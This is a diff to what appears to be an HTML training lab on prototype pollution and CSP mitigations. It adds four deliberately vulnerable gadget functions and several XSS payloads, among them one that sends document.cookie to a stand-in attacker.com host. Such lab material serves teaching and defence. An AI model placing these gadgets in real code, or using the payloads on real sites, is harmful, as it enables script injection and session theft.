@@ -93,10 +93,10 @@
             <option value="block-inline-only">Block Inline Only - Allows external scripts, blocks inline</option>
           </optgroup>
           <optgroup label="🛡️ Post-Exploitation Mitigation">
-            <option value="block-exfiltration">Block Data Exfiltration - Stops fetch/XHR & form submissions</option>
+            <option value="block-exfiltration">Block Data Exfiltration - Blocks fetch/XHR, allows same-origin forms</option>
             <option value="allow-self-only">Allow Self Only - All requests restricted to same origin</option>
-            <option value="block-requests">Block External Requests - connect-src 'none' (stops API calls)</option>
-            <option value="block-forms">Block Forms - Prevents form submission to external sites</option>
+            <option value="block-requests">Block External Requests - Blocks fetch/XHR, allows forms</option>
+            <option value="block-forms">Block ALL Forms - form-action 'none' (extreme)</option>
           </optgroup>
           <optgroup label="🎯 Attack Surface Reduction">
             <option value="block-plugins">Block Plugins - Prevents Flash/Java exploits (object-src 'none')</option>
@@ -117,10 +117,13 @@
     <form id="payloadForm" onsubmit="return false;">
       <fieldset>
         <legend>User Input (via Hash Fragment)</legend>
-        <input type="text" id="userInput" placeholder="Try: __proto__[testProp]=<img src=x onerror=alert('PP')>">
+        <input type="text" id="userInput" placeholder="Try: __proto__[bio]=<img src=x onerror=alert('XSS')>">
         <button type="button" onclick="parseHash()">Parse Hash & Apply</button>
         <button type="button" onclick="testPollution()">Test Pollution</button>
         <button type="button" onclick="resetPage()">Reset Page</button>
+        <div style="margin-top: 10px; padding: 8px; background: #fff3e0; border-radius: 3px; font-size: 0.85em;">
+          💡 <strong>Tip:</strong> Pollute a property, then trigger a gadget chain button below to escalate to XSS!
+        </div>
       </fieldset>
     </form>
 
@@ -138,20 +141,112 @@
       </div>
     </div>
 
+    <div class="output-box">
+      <h3>Gadget Chain Testing:</h3>
+      <p style="margin-bottom: 10px;">These buttons trigger vulnerable code patterns (gadgets) that can be exploited via prototype pollution:</p>
+      <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+        <button onclick="renderUserProfile()" style="padding: 8px 15px;">Render Profile (innerHTML gadget)</button>
+        <button onclick="loadUserSettings()" style="padding: 8px 15px;">Load Settings (attribute gadget)</button>
+        <button onclick="displayNotification()" style="padding: 8px 15px;">Show Notification (template gadget)</button>
+        <button onclick="initializeWidget()" style="padding: 8px 15px;">Init Widget (callback gadget)</button>
+      </div>
+      <div id="gadgetOutput" style="margin-top: 15px; padding: 15px; background: #f5f5f5; border-radius: 5px; min-height: 60px;"></div>
+    </div>
+
+    <div class="vulnerable-code-box">
+      <h3>Vulnerable Gadget Chains (Exploitable Code):</h3>
+      <p style="margin-bottom: 15px;">These are realistic vulnerable code patterns that developers might write. Each can be exploited via prototype pollution:</p>
+      
+      <div style="margin-bottom: 20px;">
+        <strong style="color: #d32f2f;">Gadget 1: innerHTML with missing property check</strong>
+        <pre><code><span class="code-keyword">function</span> <span class="code-function">renderUserProfile</span>() {
+  <span class="code-keyword">const</span> user = {};
+  <span class="code-keyword">const</span> container = document.getElementById(<span class="code-string">'gadgetOutput'</span>);
+  <span class="code-comment">// Vulnerable: accesses 'bio' without checking if it exists</span>
+  container.<span class="code-danger">innerHTML</span> = <span class="code-string">'&lt;div&gt;Bio: '</span> + user.<span class="code-danger">bio</span> + <span class="code-string">'&lt;/div&gt;'</span>;
+}</code></pre>
+        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+          <strong>Exploit:</strong> <code>__proto__[bio]=&lt;img src=x onerror=alert('XSS')&gt;</code>
+        </p>
+      </div>
+
+      <div style="margin-bottom: 20px;">
+        <strong style="color: #d32f2f;">Gadget 2: Attribute assignment without validation</strong>
+        <pre><code><span class="code-keyword">function</span> <span class="code-function">loadUserSettings</span>() {
+  <span class="code-keyword">const</span> config = {};
+  <span class="code-keyword">const</span> link = document.createElement(<span class="code-string">'a'</span>);
+  <span class="code-comment">// Vulnerable: sets href from polluted property</span>
+  link.<span class="code-danger">href</span> = config.<span class="code-danger">redirectUrl</span> || <span class="code-string">'#'</span>;
+  link.textContent = <span class="code-string">'Click here'</span>;
+  document.getElementById(<span class="code-string">'gadgetOutput'</span>).appendChild(link);
+}</code></pre>
+        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+          <strong>Exploit:</strong> <code>__proto__[redirectUrl]=javascript:alert('XSS')</code>
+        </p>
+      </div>
+
+      <div style="margin-bottom: 20px;">
+        <strong style="color: #d32f2f;">Gadget 3: Template string with object property</strong>
+        <pre><code><span class="code-keyword">function</span> <span class="code-function">displayNotification</span>() {
+  <span class="code-keyword">const</span> notification = {};
+  <span class="code-keyword">const</span> template = <span class="code-string">`&lt;div class="alert"&gt;</span>${notification.<span class="code-danger">message</span>}<span class="code-string">&lt;/div&gt;`</span>;
+  <span class="code-comment">// Vulnerable: uses polluted property in template</span>
+  document.getElementById(<span class="code-string">'gadgetOutput'</span>).<span class="code-danger">innerHTML</span> = template;
+}</code></pre>
+        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+          <strong>Exploit:</strong> <code>__proto__[message]=&lt;img src=x onerror=alert('XSS')&gt;</code>
+        </p>
+      </div>
+
+      <div style="margin-bottom: 20px;">
+        <strong style="color: #d32f2f;">Gadget 4: Event handler from object property</strong>
+        <pre><code><span class="code-keyword">function</span> <span class="code-function">initializeWidget</span>() {
+  <span class="code-keyword">const</span> widget = {};
+  <span class="code-keyword">const</span> button = document.createElement(<span class="code-string">'button'</span>);
+  button.textContent = <span class="code-string">'Widget Action'</span>;
+  <span class="code-comment">// Vulnerable: uses polluted property as event handler</span>
+  <span class="code-keyword">if</span> (widget.<span class="code-danger">onClick</span>) {
+    button.<span class="code-danger">onclick</span> = <span class="code-keyword">new Function</span>(widget.<span class="code-danger">onClick</span>);
+  }
+  document.getElementById(<span class="code-string">'gadgetOutput'</span>).appendChild(button);
+}</code></pre>
+        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+          <strong>Exploit:</strong> <code>__proto__[onClick]=alert('XSS')</code>
+        </p>
+      </div>
+    </div>
+
     <div class="example-box">
-      <h3>Try These Payloads:</h3>
-      <p><strong>Simple Test (verify pollution works):</strong></p>
+      <h3>Try These Exploitation Steps:</h3>
+      
+      <p><strong>Step 1: Verify Pollution Works</strong></p>
       <ul>
         <li><code>__proto__[testProp]=polluted</code> - Then console: <code>({}).testProp</code> should return "polluted"</li>
-        <li><code>__proto__[myValue]=hacked</code> - Then console: <code>myValue</code> should return "hacked"</li>
       </ul>
-      <p><strong>XSS via Prototype Pollution:</strong></p>
+
+      <p><strong>Step 2: Exploit Gadget Chains (Pollution → XSS)</strong></p>
       <ul>
-        <li><code>__proto__[innerHTML]=&lt;img src=x onerror=alert('Polluted')&gt;</code> - Pollutes innerHTML property</li>
-        <li><code>__proto__[onerror]=alert('Prototype Pollution')</code> - Pollutes onerror handler</li>
-        <li><code>constructor[prototype][xss]=&lt;svg/onload=alert('PP-XSS')&gt;</code> - Via constructor</li>
+        <li><strong>Gadget 1:</strong> <code>__proto__[bio]=&lt;img src=x onerror=alert('Gadget1')&gt;</code> then click "Render Profile"</li>
+        <li><strong>Gadget 2:</strong> <code>__proto__[redirectUrl]=javascript:alert('Gadget2')</code> then click "Load Settings" → click the link</li>
+        <li><strong>Gadget 3:</strong> <code>__proto__[message]=&lt;img src=x onerror=alert('Gadget3')&gt;</code> then click "Show Notification"</li>
+        <li><strong>Gadget 4:</strong> <code>__proto__[onClick]=alert('Gadget4')</code> then click "Init Widget" → click button</li>
       </ul>
-      <p><strong>How it works:</strong> The payload pollutes Object.prototype. When the app accesses a property that doesn't exist on an object, JavaScript looks up the prototype chain and finds your polluted value. Click "Test Pollution" to see which properties are now inherited by all objects!</p>
+
+      <p><strong>Step 3: Advanced Techniques</strong></p>
+      <ul>
+        <li><strong>Chain multiple gadgets:</strong> Pollute <code>bio</code>, <code>message</code>, and <code>onClick</code>, then trigger all gadgets</li>
+        <li><strong>Data exfiltration:</strong> <code>__proto__[bio]=&lt;img src=x onerror="fetch('//attacker.com?c='+document.cookie)"&gt;</code></li>
+        <li><strong>Persistent XSS:</strong> Once polluted, the property affects ALL new objects until page reload</li>
+      </ul>
+
+      <div style="margin-top: 15px; padding: 15px; background: #e3f2fd; border-radius: 5px; border-left: 4px solid #2196f3;">
+        <strong style="color: #1565c0;">💡 How Gadget Chains Work:</strong>
+        <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
+          Prototype pollution alone isn't exploitable - you need a <strong>gadget chain</strong> (vulnerable code that uses polluted properties). 
+          The payloads above pollute Object.prototype, then when vulnerable code accesses missing properties on empty objects (e.g., <code>user.bio</code>), 
+          JavaScript looks up the prototype chain and finds your malicious value, which gets executed as XSS!
+        </p>
+      </div>
     </div>
 
     <div class="active-controls" id="activeControls">
@@ -477,6 +572,77 @@
     function resetPage() {
       window.location.hash = '';
       window.location.reload();
+    }
+
+    function renderUserProfile() {
+      const user = {};
+      const container = document.getElementById('gadgetOutput');
+      const bio = user.bio || 'No bio available';
+      container.innerHTML = '<div style="padding: 10px; background: white; border-radius: 3px;"><strong>User Bio:</strong> ' + bio + '</div>';
+      
+      if (user.bio) {
+        console.log('✅ Gadget 1 triggered! user.bio was found via prototype chain:', user.bio);
+      }
+    }
+
+    function loadUserSettings() {
+      const config = {};
+      const container = document.getElementById('gadgetOutput');
+      container.innerHTML = '';
+      
+      const link = document.createElement('a');
+      link.href = config.redirectUrl || '#';
+      link.textContent = '🔗 Click here (redirect URL)';
+      link.style.padding = '10px 15px';
+      link.style.background = '#2196f3';
+      link.style.color = 'white';
+      link.style.textDecoration = 'none';
+      link.style.borderRadius = '3px';
+      link.style.display = 'inline-block';
+      
+      container.appendChild(link);
+      
+      if (config.redirectUrl) {
+        console.log('✅ Gadget 2 triggered! config.redirectUrl was found via prototype chain:', config.redirectUrl);
+      }
+    }
+
+    function displayNotification() {
+      const notification = {};
+      const message = notification.message || 'No notification';
+      const template = `<div style="padding: 10px; background: white; border-radius: 3px; border-left: 4px solid #ff9800;"><strong>🔔 Notification:</strong> ${message}</div>`;
+      
+      document.getElementById('gadgetOutput').innerHTML = template;
+      
+      if (notification.message) {
+        console.log('✅ Gadget 3 triggered! notification.message was found via prototype chain:', notification.message);
+      }
+    }
+
+    function initializeWidget() {
+      const widget = {};
+      const container = document.getElementById('gadgetOutput');
+      container.innerHTML = '';
+      
+      const button = document.createElement('button');
+      button.textContent = '🎯 Widget Action';
+      button.style.padding = '10px 15px';
+      button.style.background = '#4caf50';
+      button.style.color = 'white';
+      button.style.border = 'none';
+      button.style.borderRadius = '3px';
+      button.style.cursor = 'pointer';
+      
+      if (widget.onClick) {
+        console.log('✅ Gadget 4 triggered! widget.onClick was found via prototype chain:', widget.onClick);
+        button.onclick = new Function(widget.onClick);
+      } else {
+        button.onclick = function() {
+          alert('Widget initialized normally (no polluted onClick handler)');
+        };
+      }
+      
+      container.appendChild(button);
     }
 
     document.getElementById('prototypeFreeze').addEventListener('change', updateStatusDisplay);
